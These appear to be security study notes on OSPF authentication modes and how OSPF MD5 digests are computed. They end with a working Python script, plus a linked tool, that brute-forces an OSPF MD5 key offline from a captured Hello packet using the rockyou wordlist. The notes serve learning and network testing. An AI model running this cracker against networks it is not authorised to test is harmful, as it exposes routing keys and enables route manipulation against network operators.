
All routing protocols can be protected by using authentication and OSPF is no exception. 
There are three options for authentication:
- No authentication
- Plain text authentication 
a plaintext password is added in the clear to each OSPF packet.
- MD5 authentication

**Note :** OSPF Authentication only tells that the packet is authentic, nothing is encrypted in the packet content

| Method            | How it works                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| No authentication |                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| Plain text Auth   | A password is added in the clear of each OSPF packet, if password does not match, packet is silently ignored                                                                                                                                                                                                                                                                                                                                           |
| MD5 Auth          | An MD5 hash is calculated over a combination of the OSPF packet contents and the password. The hash output is then added to the OSPF packet before transmission. When a packet arrives, the receiving router computes an MD5 hash of the packet contents plus its locally stored password. If the calculated hash matches the one attached to the incoming packet then the check passes and the packet is processed; otherwise it is silently dropped. |


# MD5 Authentication

1. The 16 byte MD5 key is appended to the OSPF packet
2. Trailing pad and length fields are added.
3. The MD5 authentication algorithm is run over the
    concatenation of the OSPF packet, secret key, pad
    and length fields, producing a 16 byte message
    digest
4. The MD5 digest is written over the OSPF key (i.e.,
    appended to the original OSPF packet). The digest is
    not counted in the OSPF packet's length field, but
    is included in the packet's IP length field. Any
    trailing pad or length fields beyond the digest are
    not counted or transmitted.
# Bruteforce

- https://github.com/mauricelambert/OSPF_bruteforce

### With a custom python script

![](images/Pasted%20image%2020240530151745.png)
During MD5 authentication, the process generates md5(OSPF Header + OSFP Hello Packet + 16 Bytes Key).

This hash is appended to the OSPF Header + OSPF Hello Packet.

So, by knowing the OSPF Header, the OSPF Hello Packet and the hash (Auth Crypt Data), we can bruteforce the key

`if md5(Header+Hello+KEY) == AuthCryptData; then the KEY is found`

```python
1. from hashlib import md5
2. from binascii import unhexlify
4. # OSPF header + Hello Packet data
5. data = unhexlify(b"0201003003030303000000000000000200000a103c7ec8defffffffc000a1201000000280c0000020c00000102020202")
6. # Authentication code at the end of the OSPF packet
7. expected = unhexlify(b"ca39bac632801c8857650e8a28a35515")
9. with open("rockyou.txt", "rb") as f:
10.     for line in f:
11.         # Key must be 16 bytes long exactly
12.         key = line.strip()[:16]
13.         if len(key) < 16:
14.             key = key + b"\x00" * (16 - len(key))
15.         # Calculate md5(data + key) and check against expected value
16.         res = md5(data + key).digest()
17.         if res == expected:
18.             print("Found password:", line.strip().decode())
19.             break
```

# Sources

- http://networkingbodges.blogspot.com/2013/10/offline-attack-on-md5-keys-in-captured.html
- https://github.com/theclam/dechap